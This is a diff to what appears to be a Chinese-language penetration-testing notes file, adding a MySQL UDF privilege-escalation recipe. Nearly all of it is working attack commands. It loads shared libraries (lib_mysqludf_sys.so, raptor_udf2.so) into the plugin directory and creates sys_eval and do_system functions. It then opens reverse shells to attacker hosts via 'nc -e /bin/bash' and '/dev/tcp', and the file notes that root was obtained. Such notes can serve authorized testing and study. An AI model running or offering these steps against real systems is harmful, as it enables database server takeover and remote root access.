@@ -1300,10 +1300,16 @@ drwxr-xr-x 12 root     root   4096 Aug 13  2018 ..
 <summary>9. sql提权过程</summary>
 
 ```sql
-create table foo(line blob);
+-- 归纳下来，主要有两种方式，第一种方式是定义返回字符串string的udf，第二种方式是定义返回大整数integer的udf
+-- 两种方式的区别是否关联不同的攻击场景(日志痕迹、监控告警、是否返回大整数的更隐蔽等)，我暂时没有遇到过，
+-- 就暂时列出两种方式，不做推荐
+-- 第一种方式：返回字符串string的udf --
+use mysql;
+show variables like '%plugin%';   --Look for the value of plugin_dir
+create table foo(line blob);       --line是列名    blob是数据类型Binary Large Object，用来存储二进制大数据类型
 insert into foo values(load_file('/tmp/lib_mysqludf_sys.so')); 
 create function sys_eval returns string soname 'lib_mysqludf_sys.so';
-mysql> select * from mysql.func
+select * from mysql.func
 select * from mysql.func;
  +----------+-----+---------------------+----------+
  | name     | ret | dl                  | type     |
@@ -1311,9 +1317,22 @@ select * from mysql.func;
  | sys_eval |   0 | lib_mysqludf_sys.so | function |
  +----------+-----+---------------------+----------+
  1 row in set (0.00 sec)
-
+-- 第二种方式：返回大整数integer的udf --
+-- wget http://0xdeadbeef.info/exploits/raptor_udf2.c
+-- gcc -g -c raptor_udf2.c
+-- gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+-- mysql -u root -p
+use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/tmp/raptor_udf2.so'));
+show variables like '%plugin%';   --Look for the value of plugin_dir
+select * from foo into dumpfile "/usr/lib/x86_64/mariadb18/plugin/raptor_udf2.so";   --# Use the plugin_dir as the dump file location
+create function do_system returns integer soname 'raptor_udf2.so';
+select * from mysql.func;
+select do_system('nc 192.168.1.24 4444 -e /bin/bash &');
 # kali监听：nc -lvp 5555
-mysql> select sys_eval("bash -c 'exec bash -i &>/dev/tcp/192.168.0.100/5555 <&1'");
+select sys_eval("bash -c 'exec bash -i &>/dev/tcp/192.168.0.100/5555 <&1'");
+
  ```
 
 > 成功拿到root权限
